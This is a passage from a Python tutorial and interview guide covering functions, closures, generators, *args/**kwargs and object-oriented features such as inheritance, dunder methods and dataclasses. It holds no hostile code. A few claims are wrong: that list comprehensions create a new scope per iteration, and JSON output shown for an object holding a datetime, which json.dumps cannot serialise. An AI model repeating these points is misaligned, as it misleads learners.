greet("Alice", "Hi")  # TypeError!

# Combination (Python 3.8+)
def full_example(pos_only, /, pos_or_kw, *, kw_only):
    pass

full_example(1, 2, kw_only=3)  # OK
full_example(1, pos_or_kw=2, kw_only=3)  # OK
full_example(pos_only=1, pos_or_kw=2, kw_only=3)  # TypeError!
```

**Why This Matters:** Understanding parameter types helps design clear APIs and avoid calling errors.

**Related Concepts:** Function signatures (Section 2.7), API design (Section 3.3)

---

**Q2: Why should I avoid mutable default arguments?**

**A:**

```python
# ❌ DANGEROUS: Mutable default argument
def add_item(item, items=[]):
    items.append(item)
    return items

list1 = add_item(1)
print(list1)  # [1]

list2 = add_item(2)
print(list2)  # [1, 2] - Unexpected!

list3 = add_item(3)
print(list3)  # [1, 2, 3] - Shared list!

# Why: Default arguments evaluated ONCE at function definition
# The same list object is reused for all calls

# Visualize:
def show_ids(items=[]):
    print(f"ID: {id(items)}")
    items.append(1)
    return items

show_ids()  # ID: 140234567890
show_ids()  # ID: 140234567890 (same object!)
show_ids()  # ID: 140234567890

# ✅ GOOD: Use None as sentinel
def add_item(item, items=None):
    if items is None:
        items = []  # New list created each time
    items.append(item)
    return items

list1 = add_item(1)  # [1]
list2 = add_item(2)  # [2] - Correct!

# Also applies to dicts, sets, and other mutables
def add_config(key, value, config={}):  # ❌ BAD
    config[key] = value
    return config

def add_config(key, value, config=None):  # ✅ GOOD
    if config is None:
        config = {}
    config[key] = value
    return config

# ✅ GOOD: When mutable default is intentional (cache)
def expensive_operation(use_cache=True, _cache={}):
    if use_cache and 'result' in _cache:
        return _cache['result']
  
    result = perform_expensive_calculation()
  
    if use_cache:
        _cache['result'] = result
  
    return result

# But better to use lru_cache
from functools import lru_cache

@lru_cache(maxsize=1)
def expensive_operation():
    return perform_expensive_calculation()
```

**Why This Matters:** Mutable default arguments are one of Python's most common gotchas, causing subtle bugs that are hard to track down.

---

**Q3: When should I use a generator instead of returning a list?**

**A:**

```python
# List: All values in memory
def get_squares_list(n):
    return [x**2 for x in range(n)]

squares = get_squares_list(1000000)  # Uses ~8MB memory
print(sum(squares))  # Can iterate multiple times

# Generator: Values computed on-demand
def get_squares_gen(n):
    for x in range(n):
        yield x**2

squares = get_squares_gen(1000000)  # Uses ~200 bytes
print(sum(squares))  # Can iterate only once

# ✅ Use generator when:
# 1. Large dataset (memory efficiency)
def read_huge_file(filename):
    with open(filename) as f:
        for line in f:
            yield process(line)

# 2. Infinite sequence
def fibonacci():
    a, b = 0, 1
    while True:
        yield a
        a, b = b, a + b

# 3. Pipeline processing
def pipeline(data):
    filtered = (x for x in data if x > 0)
    squared = (x**2 for x in filtered)
    limited = (x for i, x in enumerate(squared) if i < 100)
    return limited

# 4. Lazy evaluation
def expensive_items():
    for i in range(1000):
        yield expensive_operation(i)  # Only computed if consumed

# ✅ Use list when:
# 1. Small dataset
def get_weekdays():
    return ['Mon', 'Tue', 'Wed', 'Thu', 'Fri']

# 2. Multiple iterations needed
numbers = [1, 2, 3, 4, 5]
print(sum(numbers))
print(max(numbers))  # Can reuse

# 3. Random access needed
items = [x for x in range(100)]
print(items[50])  # Generators don't support indexing

# 4. Length needed
items = [x for x in range(100)]
print(len(items))  # Generators don't support len()

# Performance comparison
import timeit

# List - upfront cost
def list_approach():
    squares = [x**2 for x in range(1000)]
    return sum(squares)

# Generator - lazy evaluation
def gen_approach():
    squares = (x**2 for x in range(1000))
    return sum(squares)

print(timeit.timeit(list_approach, number=10000))  # ~0.5s
print(timeit.timeit(gen_approach, number=10000))   # ~0.4s (slightly faster)

# Memory comparison
import sys

lst = [x for x in range(1000)]
gen = (x for x in range(1000))

print(sys.getsizeof(lst))  # ~9000 bytes
print(sys.getsizeof(gen))  # ~200 bytes (45x less!)
```

**Why This Matters:** Generators enable processing datasets larger than memory and improve performance through lazy evaluation.

**Related Concepts:** Iterators (Section 2.3), Memory management (Section 2.1)

---

### Interview Questions

**Question 1: What does this code output and why?**

```python
def create_functions():
    functions = []
    for i in range(3):
        functions.append(lambda: i)
    return functions

funcs = create_functions()
for f in funcs:
    print(f())
```

**Difficulty:** Mid-Level

**SDLC Relevance:** Development

**Answer:**

```python
# Output: 2, 2, 2 (NOT 0, 1, 2!)

# Why: Late binding closure
# All lambdas reference the same variable 'i'
# After loop completes, i = 2
# When lambdas execute, they all see i = 2

# Detailed explanation:
def create_functions():
    functions = []
    for i in range(3):  # i is in enclosing scope
        functions.append(lambda: i)  # Lambda captures 'i' reference
    # After loop: i = 2
    return functions

# When called, all lambdas see i = 2

# ✅ FIX 1: Default argument (early binding)
def create_functions():
    functions = []
    for i in range(3):
        functions.append(lambda i=i: i)  # Capture current value
    return functions

funcs = create_functions()
for f in funcs:
    print(f())  # 0, 1, 2

# ✅ FIX 2: Factory function
def create_functions():
    functions = []
    for i in range(3):
        def make_func(val):
            return lambda: val
        functions.append(make_func(i))
    return functions

# ✅ FIX 3: Partial
from functools import partial

def create_functions():
    return [partial(lambda x: x, i) for i in range(3)]

# ✅ FIX 4: List comprehension (creates new scope per iteration)
def create_functions():
    return [lambda i=i: i for i in range(3)]
```

**Key Points to Mention:**

- Closures capture variables by reference, not value
- Late binding: variable looked up when function called
- Default arguments evaluated at function definition (early binding)
- List comprehensions create new scope per iteration (Python 3)

**Why This Matters:** Understanding closures and variable binding is critical for callbacks, decorators, and functional programming patterns.

**Follow-up Questions:**

- How would you fix this? (Use default argument or factory function)
- What about in list comprehension? (Creates new scope in Python 3)

**Common Mistakes:**

- Expecting closures to capture values instead of references
- Not using default arguments for early binding
- Confusion between definition-time and call-time evaluation

---

**Question 2: Explain the difference between *args and **kwargs.**

**Difficulty:** Junior

**SDLC Relevance:** Development, API Design

**Answer:**

```python
# *args: Variable positional arguments (tuple)
def sum_all(*args):
    print(f"args type: {type(args)}")  # <class 'tuple'>
    print(f"args value: {args}")
    return sum(args)

result = sum_all(1, 2, 3, 4, 5)
# args type: <class 'tuple'>
# args value: (1, 2, 3, 4, 5)
# result: 15

# **kwargs: Variable keyword arguments (dict)
def print_info(**kwargs):
    print(f"kwargs type: {type(kwargs)}")  # <class 'dict'>
    print(f"kwargs value: {kwargs}")
    for key, value in kwargs.items():
        print(f"{key}: {value}")

print_info(name="Alice", age=30, city="NYC")
# kwargs type: <class 'dict'>
# kwargs value: {'name': 'Alice', 'age': 30, 'city': 'NYC'}
# name: Alice
# age: 30
# city: NYC

# Combination
def full_signature(a, b, *args, option=False, **kwargs):
    print(f"Positional: a={a}, b={b}")
    print(f"Extra positional: {args}")
    print(f"Keyword-only: option={option}")
    print(f"Extra keyword: {kwargs}")

full_signature(1, 2, 3, 4, option=True, x=10, y=20)
# Positional: a=1, b=2
# Extra positional: (3, 4)
# Keyword-only: option=True
# Extra keyword: {'x': 10, 'y': 20}

# Order matters! Must be:
# 1. Regular positional
# 2. *args
# 3. Keyword-only
# 4. **kwargs

# ✅ GOOD: Wrapper functions
def logged_db_query(*args, **kwargs):
    logger.info(f"Query: args={args}, kwargs={kwargs}")
    return database.query(*args, **kwargs)

# ✅ GOOD: Flexible APIs
class APIClient:
    def request(self, method, url, *args, **kwargs):
        # args: additional positional parameters
        # kwargs: headers, timeout, auth, etc.
        pass

client.request('GET', '/api/users', timeout=30, headers={'Auth': 'token'})

# ✅ GOOD: Extending parent class
class CustomList(list):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.created_at = datetime.now()

# Unpacking with * and **
def add(a, b, c):
    return a + b + c

numbers = [1, 2, 3]
result = add(*numbers)  # Unpacks list as positional args

data = {'a': 1, 'b': 2, 'c': 3}
result = add(**data)  # Unpacks dict as keyword args
```

**Key Points to Mention:**

- *args collects extra positional arguments into tuple
- **kwargs collects extra keyword arguments into dict
- Names 'args' and 'kwargs' are convention (can be any name)
- Order must be: positional, *args, keyword-only, **kwargs
- * and ** also used for unpacking

**Why This Matters:** *args and **kwargs enable flexible APIs, wrapper functions, and decorators. Essential for library development.

---

### Key Takeaways

**Functions:**

- **Function basics**: Use descriptive names, docstrings, type hints for clarity
- **Default arguments**: Use None for mutable defaults to avoid shared state bugs
- ***args, **kwargs**: Enable flexible function signatures; maintain parameter order
- **First-class functions**: Functions as objects enable higher-order patterns
- **Closures**: Inner functions capture enclosing scope; use nonlocal for modification
- **Decorators**: Modify function behavior; use @wraps to preserve metadata
- **Generators**: Yield for memory-efficient iteration and lazy evaluation
- **LEGB scope**: Local → Enclosing → Global → Built-in; minimize global usage
- **Recursion**: Python has no tail-call optimization; prefer iteration when possible
- **functools**: Use lru_cache for memoization, partial for partial application

**Best Practices:**

- Write small, focused functions (single responsibility)
- Use type hints for documentation and static analysis
- Prefer pure functions (no side effects) when possible
- Document with docstrings (what, not how)
- Test functions in isolation (unit tests)

---

(Continuing with Section 1.6 - Object-Oriented Programming...)

## 1.6 Object-Oriented Programming (OOP)

**SDLC Phase:** Design, Development

**Relevant For:**

- [ ] Requirements gathering
- [X] System design (class design, architecture)
- [X] Development
- [X] Testing (unit testing classes)
- [ ] Deployment
- [X] Maintenance (refactoring, extending)

Object-oriented programming organizes code into objects that combine data (attributes) and behavior (methods). Python supports OOP while remaining flexible enough to use procedural or functional styles.

### Classes and Objects

#### Class Definition

```python
# Basic class
class User:
    """Represents a user in the system."""
  
    def __init__(self, name, email):
        """Initialize a user."""
        self.name = name
        self.email = email
  
    def greet(self):
        """Return greeting message."""
        return f"Hello, I'm {self.name}"

# Create instance
user = User("Alice", "alice@example.com")
print(user.greet())  # "Hello, I'm Alice"

# Access attributes
print(user.name)  # "Alice"
print(user.email)  # "alice@example.com"
```

#### The __init__ Method

```python
class BankAccount:
    def __init__(self, account_number, balance=0):
        """Initialize bank account."""
        self.account_number = account_number
        self.balance = balance
        self.transactions = []  # New list for each instance
  
    def deposit(self, amount):
        self.balance += amount
        self.transactions.append(f"Deposit: {amount}")
  
    def withdraw(self, amount):
        if amount > self.balance:
            raise ValueError("Insufficient funds")
        self.balance -= amount
        self.transactions.append(f"Withdrawal: {amount}")

# Create instances
account1 = BankAccount("123456", 1000)
account2 = BankAccount("789012", 500)

# Each instance has independent state
account1.deposit(200)
print(account1.balance)  # 1200
print(account2.balance)  # 500 (unchanged)
```

#### Instance Attributes vs Class Attributes

```python
class Counter:
    # Class attribute (shared by all instances)
    total_count = 0
  
    def __init__(self, name):
        # Instance attribute (unique to each instance)
        self.name = name
        self.count = 0
        Counter.total_count += 1
  
    def increment(self):
        self.count += 1

# Class attribute accessed on class
print(Counter.total_count)  # 0

# Create instances
c1 = Counter("Counter 1")
c2 = Counter("Counter 2")

print(Counter.total_count)  # 2 (shared)
print(c1.total_count)  # 2 (also accessible on instance)

c1.increment()
print(c1.count)  # 1
print(c2.count)  # 0 (independent)

# ⚠️ CAUTION: Shadowing class attribute
c1.total_count = 100  # Creates instance attribute!
print(c1.total_count)  # 100 (instance attribute)
print(c2.total_count)  # 2 (class attribute)
print(Counter.total_count)  # 2 (class attribute unchanged)

# ✅ GOOD: Modify class attribute via class
Counter.total_count = 100
print(c1.total_count)  # 100 (if no instance attribute)
print(c2.total_count)  # 100

# ❌ BAD: Mutable class attribute
class BadClass:
    items = []  # Shared by all instances!
  
    def add_item(self, item):
        self.items.append(item)

obj1 = BadClass()
obj2 = BadClass()
obj1.add_item("A")
print(obj2.items)  # ['A'] - Unexpected!

# ✅ GOOD: Mutable instance attribute
class GoodClass:
    def __init__(self):
        self.items = []  # New list per instance
  
    def add_item(self, item):
        self.items.append(item)
```

#### Methods (Instance, Class, Static)

```python
class MathOperations:
    pi = 3.14159
  
    def __init__(self, value):
        self.value = value
  
    # Instance method (has self)
    def double(self):
        return self.value * 2
  
    # Class method (has cls)
    @classmethod
    def create_from_string(cls, string):
        """Alternative constructor."""
        value = float(string)
        return cls(value)
  
    # Static method (no self or cls)
    @staticmethod
    def add(a, b):
        """Utility function."""
        return a + b

# Instance method
obj = MathOperations(5)
print(obj.double())  # 10

# Class method (alternative constructor)
obj2 = MathOperations.create_from_string("7.5")
print(obj2.value)  # 7.5

# Static method
result = MathOperations.add(10, 20)  # 30

# ✅ GOOD: Class methods for factory patterns
from datetime import date

class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age
  
    @classmethod
    def from_birth_year(cls, name, birth_year):
        current_year = date.today().year
        age = current_year - birth_year
        return cls(name, age)
  
    @classmethod
    def from_dict(cls, data):
        return cls(data['name'], data['age'])

# Multiple ways to create instances
p1 = Person("Alice", 30)
p2 = Person.from_birth_year("Bob", 1990)
p3 = Person.from_dict({"name": "Charlie", "age": 25})

# ✅ GOOD: Static methods for utilities
class StringUtils:
    @staticmethod
    def reverse(text):
        return text[::-1]
  
    @staticmethod
    def capitalize_words(text):
        return ' '.join(word.capitalize() for word in text.split())

print(StringUtils.reverse("hello"))  # "olleh"
```

#### Property Decorators (@property)

```python
class Temperature:
    def __init__(self, celsius):
        self._celsius = celsius
  
    @property
    def celsius(self):
        """Get temperature in Celsius."""
        return self._celsius
  
    @celsius.setter
    def celsius(self, value):
        """Set temperature in Celsius."""
        if value < -273.15:
            raise ValueError("Temperature below absolute zero!")
        self._celsius = value
  
    @property
    def fahrenheit(self):
        """Get temperature in Fahrenheit."""
        return self._celsius * 9/5 + 32
  
    @fahrenheit.setter
    def fahrenheit(self, value):
        """Set temperature using Fahrenheit."""
        self.celsius = (value - 32) * 5/9

# Use like attributes
temp = Temperature(25)
print(temp.celsius)  # 25
print(temp.fahrenheit)  # 77.0

temp.fahrenheit = 32
print(temp.celsius)  # 0.0

# Validation
try:
    temp.celsius = -300  # ValueError
except ValueError as e:
    print(e)

# ✅ GOOD: Computed properties
class Rectangle:
    def __init__(self, width, height):
        self.width = width
        self.height = height
  
    @property
    def area(self):
        return self.width * self.height
  
    @property
    def perimeter(self):
        return 2 * (self.width + self.height)

rect = Rectangle(10, 5)
print(rect.area)  # 50 (computed on access)

# ✅ GOOD: Lazy loading
class DataLoader:
    def __init__(self, filename):
        self.filename = filename
        self._data = None
  
    @property
    def data(self):
        if self._data is None:
            self._data = self._load_data()
        return self._data
  
    def _load_data(self):
        print("Loading data...")
        # Expensive operation
        return [1, 2, 3, 4, 5]

loader = DataLoader("data.csv")
# Data not loaded yet
print(loader.data)  # "Loading data..." then [1, 2, 3, 4, 5]
print(loader.data)  # [1, 2, 3, 4, 5] (cached, no loading message)
```

### Inheritance

#### Single Inheritance

```python
# Base class
class Animal:
    def __init__(self, name):
        self.name = name
  
    def speak(self):
        return "Some sound"
  
    def move(self):
        return "Moving..."

# Derived class
class Dog(Animal):
    def speak(self):  # Override
        return "Woof!"
  
    def fetch(self):  # New method
        return f"{self.name} is fetching!"

# Derived class
class Cat(Animal):
    def speak(self):  # Override
        return "Meow!"
  
    def climb(self):  # New method
        return f"{self.name} is climbing!"

dog = Dog("Rex")
print(dog.speak())  # "Woof!" (overridden)
print(dog.move())  # "Moving..." (inherited)
print(dog.fetch())  # "Rex is fetching!" (new method)

cat = Cat("Whiskers")
print(cat.speak())  # "Meow!"
```

#### Multiple Inheritance

```python
class Flyer:
    def fly(self):
        return "Flying..."

class Swimmer:
    def swim(self):
        return "Swimming..."

# Multiple inheritance
class Duck(Animal, Flyer, Swimmer):
    def speak(self):
        return "Quack!"

duck = Duck("Donald")
print(duck.speak())  # "Quack!"
print(duck.fly())  # "Flying..."
print(duck.swim())  # "Swimming..."
print(duck.move())  # "Moving..." (from Animal)

# ⚠️ CAUTION: Diamond problem
class A:
    def method(self):
        return "A"

class B(A):
    def method(self):
        return "B"

class C(A):
    def method(self):
        return "C"

class D(B, C):
    pass

d = D()
print(d.method())  # "B" (follows MRO)
```

#### Method Resolution Order (MRO)

```python
class A:
    def method(self):
        return "A"

class B(A):
    def method(self):
        return "B"

class C(A):
    def method(self):
        return "C"

class D(B, C):
    pass

# MRO determines which method is called
print(D.__mro__)
# (<class 'D'>, <class 'B'>, <class 'C'>, <class 'A'>, <class 'object'>)

print(D.mro())  # Same as __mro__

d = D()
print(d.method())  # "B" (first in MRO after D)

# C3 Linearization algorithm
# Ensures:
# 1. Child classes before parents
# 2. Parents in order they're listed
# 3. Consistent with parent MROs
```

#### super() Function

```python
class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age
  
    def introduce(self):
        return f"I'm {self.name}, {self.age} years old"

class Employee(Person):
    def __init__(self, name, age, employee_id):
        super().__init__(name, age)  # Call parent __init__
        self.employee_id = employee_id
  
    def introduce(self):
        # Call parent method and extend
        base = super().introduce()
        return f"{base}. Employee ID: {self.employee_id}"

emp = Employee("Alice", 30, "E123")
print(emp.introduce())
# "I'm Alice, 30 years old. Employee ID: E123"

# ✅ GOOD: super() in multiple inheritance
class Base1:
    def __init__(self):
        print("Base1")
        super().__init__()

class Base2:
    def __init__(self):
        print("Base2")
        super().__init__()

class Derived(Base1, Base2):
    def __init__(self):
        print("Derived")
        super().__init__()

d = Derived()
# Output:
# Derived
# Base1
# Base2

# Why: super() follows MRO, not just immediate parent
print(Derived.__mro__)
# (<class 'Derived'>, <class 'Base1'>, <class 'Base2'>, <class 'object'>)

# ❌ BAD: Calling parent directly (breaks MRO)
class BadDerived(Base1, Base2):
    def __init__(self):
        Base1.__init__(self)  # Only calls Base1, skips Base2!
        Base2.__init__(self)

# ✅ GOOD: Always use super()
class GoodDerived(Base1, Base2):
    def __init__(self):
        super().__init__()  # Follows MRO correctly
```

#### Abstract Base Classes (ABC)

```python
from abc import ABC, abstractmethod

class Shape(ABC):
    @abstractmethod
    def area(self):
        """Calculate area."""
        pass
  
    @abstractmethod
    def perimeter(self):
        """Calculate perimeter."""
        pass
  
    # Concrete method
    def describe(self):
        return f"Shape with area {self.area()}"

# ❌ Can't instantiate abstract class
try:
    shape = Shape()  # TypeError
except TypeError:
    print("Can't instantiate abstract class")

# ✅ Must implement all abstract methods
class Rectangle(Shape):
    def __init__(self, width, height):
        self.width = width
        self.height = height
  
    def area(self):
        return self.width * self.height
  
    def perimeter(self):
        return 2 * (self.width + self.height)

rect = Rectangle(10, 5)
print(rect.area())  # 50
print(rect.describe())  # "Shape with area 50"

# ✅ GOOD: Abstract base class for interface
from abc import ABC, abstractmethod

class Repository(ABC):
    @abstractmethod
    def save(self, entity):
        pass
  
    @abstractmethod
    def find_by_id(self, id):
        pass
  
    @abstractmethod
    def delete(self, id):
        pass

class DatabaseRepository(Repository):
    def save(self, entity):
        # Save to database
        pass
  
    def find_by_id(self, id):
        # Query database
        pass
  
    def delete(self, id):
        # Delete from database
        pass
```

#### Mixins

```python
# Mixin: Provides functionality to be mixed into classes
class JSONMixin:
    def to_json(self):
        import json
        return json.dumps(self.__dict__)
  
    @classmethod
    def from_json(cls, json_string):
        import json
        data = json.loads(json_string)
        return cls(**data)

class TimestampMixin:
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        from datetime import datetime
        self.created_at = datetime.now()

# Use mixins
class User(JSONMixin, TimestampMixin):
    def __init__(self, name, email):
        super().__init__()
        self.name = name
        self.email = email

user = User("Alice", "alice@example.com")
print(user.to_json())
# {"name": "Alice", "email": "alice@example.com", "created_at": "2025-01-02..."}

# ✅ GOOD: Mixin naming convention
# End mixin class names with "Mixin"
# Keep mixins focused (single responsibility)
# Don't use mixins for state, only behavior
```

#### Composition vs Inheritance

```python
# ❌ BAD: Inheritance for code reuse
class List(list):
    def sum(self):
        return sum(self)

# Better: Composition
class NumberList:
    def __init__(self):
        self._items = []
  
    def append(self, item):
        self._items.append(item)
  
    def sum(self):
        return sum(self._items)

# ✅ GOOD: Favor composition over inheritance
class Engine:
    def start(self):
        return "Engine started"

class Car:
    def __init__(self):
        self.engine = Engine()  # Composition
  
    def start(self):
        return self.engine.start()

# vs Inheritance (tight coupling)
class Car(Engine):
    def start(self):
        return super().start()

# When to use each:
# - Inheritance: "is-a" relationship (Dog is an Animal)
# - Composition: "has-a" relationship (Car has an Engine)
```

### Special Methods (Magic/Dunder Methods)

#### Object Lifecycle

```python
class Resource:
    def __new__(cls, *args, **kwargs):
        """Create instance (before __init__)."""
        print("__new__ called")
        instance = super().__new__(cls)
        return instance
  
    def __init__(self, name):
        """Initialize instance."""
        print("__init__ called")
        self.name = name
  
    def __del__(self):
        """Destructor (cleanup)."""
        print(f"__del__ called for {self.name}")

r = Resource("R1")
# __new__ called
# __init__ called

del r
# __del__ called for R1

# ⚠️ CAUTION: Don't rely on __del__ for cleanup
# Use context managers instead
```

#### String Representation

```python
class User:
    def __init__(self, name, age):
        self.name = name
        self.age = age
  
    def __str__(self):
        """Informal string (for end users)."""
        return f"User: {self.name}"
  
    def __repr__(self):
        """Official string (for developers)."""
        return f"User(name={self.name!r}, age={self.age!r})"

user = User("Alice", 30)

print(str(user))  # "User: Alice"
print(repr(user))  # "User(name='Alice', age=30)"

print(user)  # Uses __str__ if defined, else __repr__
# "User: Alice"

# ✅ GOOD: __repr__ should be unambiguous
# Ideally: eval(repr(obj)) == obj

class Point:
    def __init__(self, x, y):
        self.x = x
        self.y = y
  
    def __repr__(self):
        return f"Point({self.x}, {self.y})"
  
    def __eq__(self, other):
        return self.x == other.x and self.y == other.y

p = Point(1, 2)
print(repr(p))  # "Point(1, 2)"
p2 = eval(repr(p))  # Creates new Point(1, 2)
print(p == p2)  # True
```

#### Comparison Operators

```python
class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age
  
    def __eq__(self, other):
        """Equal (==)."""
        if not isinstance(other, Person):
            return NotImplemented
        return self.age == other.age
  
    def __ne__(self, other):
        """Not equal (!=)."""
        result = self.__eq__(other)
        if result is NotImplemented:
            return result
        return not result
  
    def __lt__(self, other):
        """Less than (<)."""
        if not isinstance(other, Person):
            return NotImplemented
        return self.age < other.age
  
    def __le__(self, other):
        """Less than or equal (<=)."""
        return self.__lt__(other) or self.__eq__(other)
  
    def __gt__(self, other):
        """Greater than (>)."""
        if not isinstance(other, Person):
            return NotImplemented
        return self.age > other.age
  
    def __ge__(self, other):
        """Greater than or equal (>=)."""
        return self.__gt__(other) or self.__eq__(other)

p1 = Person("Alice", 30)
p2 = Person("Bob", 25)

print(p1 > p2)  # True
print(p1 == p2)  # False

# ✅ BETTER: Use functools.total_ordering
from functools import total_ordering

@total_ordering
class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age
  
    def __eq__(self, other):
        if not isinstance(other, Person):
            return NotImplemented
        return self.age == other.age
  
    def __lt__(self, other):
        if not isinstance(other, Person):
            return NotImplemented
        return self.age < other.age

# Only need to define __eq__ and one ordering method
# @total_ordering generates the rest
```

#### Hash and Equality

```python
class Point:
    def __init__(self, x, y):
        self.x = x
        self.y = y
  
    def __eq__(self, other):
        if not isinstance(other, Point):
            return NotImplemented
        return self.x == other.x and self.y == other.y
  
    def __hash__(self):
        return hash((self.x, self.y))

# Now hashable (can be dict key or in set)
p1 = Point(1, 2)
p2 = Point(1, 2)

print(p1 == p2)  # True
print(hash(p1) == hash(p2))  # True

# Can use in set
points = {p1, p2}
print(len(points))  # 1 (treated as same)

# Can use as dict key
d = {p1: "Point at (1,2)"}
print(d[p2])  # Works! "Point at (1,2)"

# ⚠️ CAUTION: Mutable objects shouldn't be hashable
class BadPoint:
    def __init__(self, x, y):
        self.x = x
        self.y = y
  
    def __hash__(self):
        return hash((self.x, self.y))

p = BadPoint(1, 2)
s = {p}
p.x = 10  # Modify after adding to set
# Now p can't be found in set (hash changed)!

# ✅ GOOD: Immutable or don't define __hash__
```

#### Container Emulation

```python
class MyList:
    def __init__(self):
        self._items = []
  
    def __len__(self):
        """len(obj)."""
        return len(self._items)
  
    def __getitem__(self, index):
        """obj[index]."""
        return self._items[index]
  
    def __setitem__(self, index, value):
        """obj[index] = value."""
        self._items[index] = value
  
    def __delitem__(self, index):
        """del obj[index]."""
        del self._items[index]
  
    def __contains__(self, item):
        """item in obj."""
        return item in self._items

ml = MyList()
ml._items = [1, 2, 3]

print(len(ml))  # 3
print(ml[1])  # 2
ml[1] = 20
print(2 in ml)  # False
print(20 in ml)  # True
```

#### Iterator Protocol

```python
class Countdown:
    def __init__(self, start):
        self.current = start
  
    def __iter__(self):
        """Return iterator object (self)."""
        return self
  
    def __next__(self):
        """Return next item."""
        if self.current <= 0:
            raise StopIteration
        self.current -= 1
        return self.current + 1

# Use in for loop
for num in Countdown(5):
    print(num)  # 5, 4, 3, 2, 1

# Manual iteration
cd = Countdown(3)
print(next(cd))  # 3
print(next(cd))  # 2
print(next(cd))  # 1
# next(cd)  # StopIteration
```

#### Context Manager Protocol

```python
class File:
    def __init__(self, filename, mode):
        self.filename = filename
        self.mode = mode
        self.file = None
  
    def __enter__(self):
        """Setup (called when entering 'with' block)."""
        print("Opening file")
        self.file = open(self.filename, self.mode)
        return self.file
  
    def __exit__(self, exc_type, exc_val, exc_tb):
        """Cleanup (called when exiting 'with' block)."""
        print("Closing file")
        if self.file:
            self.file.close()
        # Return False to propagate exceptions
        return False

# Use with 'with' statement
with File('test.txt', 'w') as f:
    f.write('Hello, World!')

# Output:
# Opening file
# Closing file
```

#### Callable Objects

```python
class Multiplier:
    def __init__(self, factor):
        self.factor = factor
  
    def __call__(self, x):
        """Make instance callable."""
        return x * self.factor

double = Multiplier(2)
triple = Multiplier(3)

print(double(5))  # 10 (calls __call__)
print(triple(5))  # 15

# Check if callable
print(callable(double))  # True
print(callable(5))  # False

# ✅ GOOD: Stateful functions
class Counter:
    def __init__(self):
        self.count = 0
  
    def __call__(self):
        self.count += 1
        return self.count

counter = Counter()
print(counter())  # 1
print(counter())  # 2
print(counter())  # 3
```

#### Attribute Access

```python
class DynamicAttributes:
    def __init__(self):
        self._data = {}
  
    def __getattr__(self, name):
        """Called when attribute not found."""
        print(f"Getting {name}")
        if name in self._data:
            return self._data[name]
        raise AttributeError(f"No attribute '{name}'")
  
    def __setattr__(self, name, value):
        """Called when setting any attribute."""
        print(f"Setting {name} = {value}")
        if name == '_data':
            # Use super to avoid recursion
            super().__setattr__(name, value)
        else:
            self._data[name] = value
  
    def __delattr__(self, name):
        """Called when deleting attribute."""
        print(f"Deleting {name}")
        if name in self._data:
            del self._data[name]
  
    def __getattribute__(self, name):
        """Called for ALL attribute access."""
        print(f"Accessing {name}")
        return super().__getattribute__(name)

obj = DynamicAttributes()
obj.x = 10  # "Setting x = 10"
print(obj.x)  # "Accessing _data", "Getting x", prints 10
del obj.x  # "Deleting x"

# ⚠️ CAUTION: __getattribute__ is powerful but dangerous
# Easy to create infinite recursion
```

#### Operator Overloading

```python
class Vector:
    def __init__(self, x, y):
        self.x = x
        self.y = y
  
    def __add__(self, other):
        """Addition (+)."""
        return Vector(self.x + other.x, self.y + other.y)
  
    def __sub__(self, other):
        """Subtraction (-)."""
        return Vector(self.x - other.x, self.y - other.y)
  
    def __mul__(self, scalar):
        """Multiplication (*)."""
        return Vector(self.x * scalar, self.y * scalar)
  
    def __truediv__(self, scalar):
        """Division (/)."""
        return Vector(self.x / scalar, self.y / scalar)
  
    def __repr__(self):
        return f"Vector({self.x}, {self.y})"

v1 = Vector(1, 2)
v2 = Vector(3, 4)

print(v1 + v2)  # Vector(4, 6)
print(v1 - v2)  # Vector(-2, -2)
print(v1 * 2)  # Vector(2, 4)
print(v2 / 2)  # Vector(1.5, 2.0)
```

### Advanced OOP

#### Data Classes (@dataclass)

```python
from dataclasses import dataclass, field
from typing import List

# ✅ GOOD: Dataclass for data containers
@dataclass
class User:
    name: str
    age: int
    email: str = "no-email@example.com"  # Default value
    active: bool = True
  
    # Automatically generates:
    # - __init__
    # - __repr__
    # - __eq__

user = User("Alice", 30)
print(user)
# User(name='Alice', age=30, email='no-email@example.com', active=True)

# ✅ GOOD: Immutable dataclass
@dataclass(frozen=True)
class Point:
    x: float
    y: float

p = Point(1.0, 2.0)
# p.x = 3.0  # FrozenInstanceError!

# ✅ GOOD: Default factory for mutable defaults
@dataclass
class Team:
    name: str
    members: List[str] = field(default_factory=list)

team1 = Team("Team A")
team2 = Team("Team B")
team1.members.append("Alice")
print(team2.members)  # [] (separate list)

# Comparison
@dataclass(order=True)
class Person:
    name: str
    age: int

people = [Person("Bob", 30), Person("Alice", 25)]
people.sort()  # Sorts by fields in order
print(people)  # [Person(name='Alice', age=25), Person(name='Bob', age=30)]
```

#### Enumerations (Enum)

```python
from enum import Enum, IntEnum, auto

class Color(Enum):
    RED = 1
    GREEN = 2
    BLUE = 3

# Access
print(Color.RED)  # Color.RED
print(Color.RED.name)  # 'RED'
print(Color.RED.value)  # 1

# Comparison
print(Color.RED == Color.RED)  # True
print(Color.RED == 1)  # False (strict typing)

# Iteration
for color in Color:
    print(color)

# ✅ GOOD: Auto values
class Status(Enum):
    PENDING = auto()  # 1
    APPROVED = auto()  # 2
    REJECTED = auto()  # 3

# ✅ GOOD: String enums
class Environment(str, Enum):
    DEV = "development"
    STAGING = "staging"
    PROD = "production"

# IntEnum for backward compatibility
class Priority(IntEnum):
    LOW = 1
    MEDIUM = 2
    HIGH = 3

print(Priority.HIGH > Priority.LOW)  # True
print(Priority.HIGH == 3)  # True (IntEnum allows int comparison)
```

#### Protocol (Structural Subtyping)

```python
from typing import Protocol

class Drawable(Protocol):
    def draw(self) -> None:
        ...

# No inheritance needed, just implement protocol
class Circle:
    def draw(self) -> None:
        print("Drawing circle")

class Square:
    def draw(self) -> None:
        print("Drawing square")

def render(obj: Drawable) -> None:
    obj.draw()

# Both work (duck typing with type checking)
render(Circle())  # "Drawing circle"
render(Square())  # "Drawing square"

# Type checker verifies protocol compliance
class BadShape:
    pass

# render(BadShape())  # Type error (no draw method)
```

### Frequently Asked Questions

**Q1: When should I use class methods vs static methods?**

**A:**

```python
# Class method: Has access to class (cls)
class Pizza:
    def __init__(self, ingredients):
        self.ingredients = ingredients
  
    @classmethod
    def margherita(cls):
        """Factory method - returns instance."""
